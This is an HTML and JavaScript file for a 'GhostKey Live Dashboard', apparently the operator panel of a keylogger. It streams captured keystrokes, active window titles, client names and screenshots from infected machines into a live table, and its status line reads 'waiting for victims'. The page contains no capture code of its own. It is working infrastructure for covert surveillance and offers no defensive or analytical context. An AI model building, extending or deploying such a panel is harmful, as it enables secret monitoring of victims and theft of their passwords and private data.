<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>GhostKey Live Dashboard</title>
<style>
  body{background:#000;color:#0f0;font-family:Consolas,monospace;margin:0;padding:20px;line-height:1.5}
  h1{font-size:2em;margin:0 0 20px}
  .dot{width:14px;height:14px;background:#0f0;border-radius:50%;display:inline-block;animation:p:2s infinite}
  @keyframes p{0%,100%{opacity:1}50%{opacity:0.4}}
  .status{margin:15px 0;font-size:1.2em}
  .ok{color:#0f0}
  .error{color:#f66}
  table{width:100%;border-collapse:collapse;margin-top:20px}
  th{background:#111;padding:10px;text-align:left}
  td{padding:8px;border-bottom:1px solid #333}
  .ss{width:180px;height:100px;object-fit:cover;cursor:pointer;border:2px solid #333;border-radius:6px}
  .ss:hover{border-color:#0f0}
  .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);justify-content:center;align-items:center;z-index:99}
  .modal img{max-width:95%;max-height:95vh;border-radius:10px}
</style>
</head>
<body>
<h1><span class="dot"></span> GhostKey Live Dashboard</h1>
<div class="status ok" id="status">Starting connection...</div>

<table id="logtable" style="display:none">
  <thead><tr>
    <th>#</th><th>Time</th><th>Client</th><th>Window</th><th>Keys</th><th>Screenshot</th>
  </tr></thead>
  <tbody id="logs"></tbody>
</table>

<div id="modal" class="modal" onclick="this.style.display='none'">
  <img id="big">
</div>

<script>
let counter = 1;
const tbody = document.getElementById("logs");
const table = document.getElementById("logtable");
const status = document.getElementById("status");

function connect() {
  status.textContent = "Connecting to server...";
  status.className = "status";

  const es = new EventSource("/events");

  es.onopen = () => {
    status.textContent = "Connected — waiting for victims...";
    status.className = "status ok";
    table.style.display = "table";
  };

  es.onmessage = (e) => {
    if (e.data.trim() === "" || e.data.startsWith(":")) return; // heartbeat
    try {
      const d = JSON.parse(e.data);
      const row = document.createElement("tr");
      const ts = new Date().toISOString().slice(0,19).replace("T"," ");
      row.innerHTML = `
        <td>${counter++}</td>
        <td>${ts}</td>
        <td><b>${d.Client||"?"}</b></td>
        <td>${d.Window||"Desktop"}</td>
        <td>${(d.Keys||[]).join("").substring(0,150)}${(d.Keys||[]).length>150?"...":""}</td>
        <td>${d.Screenshot ? `<img class="ss" src="${d.Screenshot}" onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">` : "—"}</td>
      `;
      tbody.insertBefore(row, tbody.firstChild);
    } catch(e) {}
  };

  es.onerror = () => {
    es.close();
    status.textContent = "Connection lost — retrying in 3s...";
    status.className = "status error";
    setTimeout(connect, 3000);
  };
}

// Start it
connect();
</script>
</body>
</html>